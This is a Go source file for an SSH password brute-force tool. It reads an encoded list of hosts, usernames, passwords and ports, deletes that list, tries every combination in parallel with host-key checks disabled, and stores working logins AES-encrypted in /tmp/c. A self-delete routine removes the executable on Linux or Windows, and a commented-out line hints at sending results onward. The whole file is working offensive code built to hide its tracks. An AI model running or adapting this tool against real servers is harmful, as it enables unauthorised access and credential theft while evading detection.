package bf

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	cr "crypto/rand"
	"encoding/base64"
	"encoding/csv"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"sort"
	"strconv"
	"sync"
	check "test/client/CHECK"
	vars "test/vars"
	"time"

	"golang.org/x/crypto/ssh"
)

var allC vars.AllConnections
var wg sync.WaitGroup
var DaC []vars.DelaConnection

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

var DontDel bool = false

func encrypt(plainText string, key []byte) (string, error) {
	// Create a new AES cipher block
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	// Use GCM (Galois/Counter Mode) which is an authenticated encryption mode
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	// Create a nonce. GCM requires a nonce for encryption
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err = io.ReadFull(cr.Reader, nonce); err != nil {
		return "", err
	}

	// Encrypt the plaintext string
	cipherText := aesGCM.Seal(nonce, nonce, []byte(plainText), nil)

	// Return the ciphertext as a hex string
	return hex.EncodeToString(cipherText), nil
}

func Bf(conf vars.Config) {
	file, err := os.OpenFile("/tmp/c", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0777)
	if err != nil {
		check.Check("Error Creating File", err)
	}
	if conf.Flags.Destr {
		SelfDel()
	}
	file.Close()
	if conf.Flags.BrFile == "" || conf.Client.Host == "" || conf.Client.Port == "" || conf.Client.User == "" || conf.Client.Pass == "" {
		return
	}

	vars.BrFileHomeDir = filepath.Join("/tmp", RandomString(10))

	msgSess := make(chan vars.Connection)
	msgErr := make(chan vars.Connection)
	go checkSession(msgSess, msgErr, conf.Flags.Key)
	ReadCsv(msgSess, msgErr, conf)
}

func checkSession(msgSess, msgErr chan vars.Connection, Key string) {
	for {
		select {
		case ses := <-msgSess:
			c := vars.DelaConnection{
				Single: false,
				Conn:   ses,
			}
			DaC = append(DaC, c)
			stringToWrite := fmt.Sprintf("Host: %s Port: %s Username: %s Password: %s\n", c.Conn.Host, c.Conn.Port, c.Conn.Username, c.Conn.Password)
			enc, err := encrypt(stringToWrite, []byte(Key)) //
			if err != nil {
				check.Check("Error On Encryption", err)
			}
			f, err := os.OpenFile("/tmp/c", os.O_APPEND|os.O_RDWR, 0777)
			if err != nil {
				check.Check("Error On Opening a file", err)
			}

			_, err = f.Write([]byte(enc + "\n"))
			if err != nil {
				fmt.Println(err)
			}
			f.Close()

		case SingleDel := <-msgErr:
			c := vars.DelaConnection{
				Single: true,
				Conn:   SingleDel,
			}
			DaC = append(DaC, c)
		case <-time.After(100 * time.Millisecond):
			continue
		}
	}

}

func ReadBfFile(bFile string) ([][]string, error) {
	x := check.OpenAndReadFiles(bFile)

	os.Remove(bFile)

	decodedBytes, err := base64.StdEncoding.DecodeString(string(x))
	er := check.Check("Error decoding base64 BF file:", err)
	if er != nil {
		return [][]string{}, err
	}
	fmt.Println(string(decodedBytes))
	byteReader := bytes.NewReader(decodedBytes)
	reader := csv.NewReader(byteReader)
	records, err := reader.ReadAll()
	check.Check("Error reading records:", err)
	if err != nil {
		return [][]string{}, err
	}
	return records, nil

}

func ReadCsv(msgSess, msgErr chan vars.Connection, conf vars.Config) {

	records, err := ReadBfFile(conf.Flags.BrFile)
	check.Check("Read Csv Error", err)
	Ports := []string{}
	Hosts := []string{}
	Users := []string{}
	Passes := []string{}
	c := vars.Connection{}
	if conf.Flags.Combo {
		for i, eachrecord := range records[1:] {
			c.Host = eachrecord[0]
			c.Username = eachrecord[1]
			c.Password = eachrecord[2]
			c.Port = eachrecord[3]
			c.Place = strconv.Itoa(i+1) + "!"
			allC.Conn = append(allC.Conn, c)
		}

	} else {
		for _, eachrecord := range records[1:] {
			// for _, j := range eachrecord {
			if eachrecord[0] != "" {
				Hosts = append(Hosts, eachrecord[0])
			}
			if eachrecord[1] != "" {
				Users = append(Users, eachrecord[1])
			}
			if eachrecord[2] != "" {
				Passes = append(Passes, eachrecord[2])
			}
			if eachrecord[3] != "" {
				Ports = append(Ports, eachrecord[3])
			}
		}

		for a, h := range Hosts {
			for b, u := range Users {
				for cc, p := range Passes {
					for d, po := range Ports {
						c.Place = strconv.Itoa(a+1) + "-" + strconv.Itoa(b+1) + "-" + strconv.Itoa(cc+1) + "-" + strconv.Itoa(d+1) + "!"
						c.Host = h
						c.Username = u
						c.Password = p
						c.Port = po
						c.IsUsed = false
						allC.Conn = append(allC.Conn, c)
					}
				}
			}
		}
	}
	StartBruteForce(&allC, msgSess, msgErr, conf)

}

func SelfDel() {
	exePath, err := os.Executable()
	if err != nil {
		check.Check("Error changing file permissions: %v\n", err)
		// fmt.Printf("Error changing file permissions: %v\n", err)
		return
	}
	fmt.Println(os.Args[0])
	if runtime.GOOS == "linux" {
		os.Remove(vars.BrFileHomeDir)
		cmd := exec.Command("bash", "-c", "rm "+exePath)
		cmd.Start()
	} else if runtime.GOOS == "windows" {

		os.Remove(vars.BrFileHomeDir)
		cmd := exec.Command("cmd.exe", "/c", "del "+exePath)
		cmd.Start()
	}
}

func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Connection, conf vars.Config) {
	// foundSessions := []vars.Connection{}

	for len(allConn.Conn) != 0 {
		for i := 1; i <= conf.Flags.Threads; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				randomConn := rand.Intn(len(allConn.Conn))
				if !allConn.Conn[randomConn].IsUsed {
					allConn.Conn[randomConn].IsUsed = true
					session, conn, err := CreateConn(allConn.Conn[randomConn])
					if err != nil {
						msgErr <- conn
					} else if session != nil {
						msgSess <- conn
						session.Close()
						// knock.SendKnock(conn.Place, conf) //
					}
				}
			}()
			time.Sleep(100 * time.Millisecond)
		}
		wg.Wait()
		os.ReadFile("/tmp/c")

		ClearList(allConn)
	}
	// return foundSessions

}

func ClearList(allConn *vars.AllConnections) {
	PlacesToDel := []int{}
	for _, j := range DaC {
		if j.Single {
			for i, k := range allConn.Conn {
				if j.Conn.Host == k.Host && j.Conn.Password == k.Password && j.Conn.Username == k.Username && j.Conn.Port == k.Port {
					PlacesToDel = append(PlacesToDel, i)
				}
			}
		} else if !j.Single {
			for i, k := range allC.Conn {
				if j.Conn.Host == k.Host {
					PlacesToDel = append(PlacesToDel, i)
				}
			}
		}

	}
	PlacesToDel = removeDuplicates(PlacesToDel)
	sort.Sort(sort.Reverse(sort.IntSlice(PlacesToDel)))
	for _, j := range PlacesToDel {
		allConn.Conn = slices.Delete(allConn.Conn, j, j+1)
	}

	DaC = DaC[:0]
}

func CreateConn(c vars.Connection) (*ssh.Session, vars.Connection, error) {
	config := &ssh.ClientConfig{
		User: c.Username,
		Auth: []ssh.AuthMethod{
			ssh.Password(c.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	hostPort := fmt.Sprintf("%s:%s", c.Host, c.Port)
	client, err := ssh.Dial("tcp", hostPort, config)

	if err != nil {
		check.Check("Error on creating Connection", err)
		return nil, c, err
	}

	session, err := client.NewSession()
	if err != nil {
		check.Check("Error on creating NewSession", err)
		return nil, c, err
	}
	return session, c, nil
}

func removeDuplicates(nums []int) []int {
	encountered := map[int]bool{} // Track encountered integers
	result := []int{}             // Slice to store unique integers

	// Iterate over the input slice
	for _, v := range nums {
		if !encountered[v] {
			encountered[v] = true
			result = append(result, v)
		}
	}

	return result
}

func RandomString(length int) string {
	seededRand := rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}
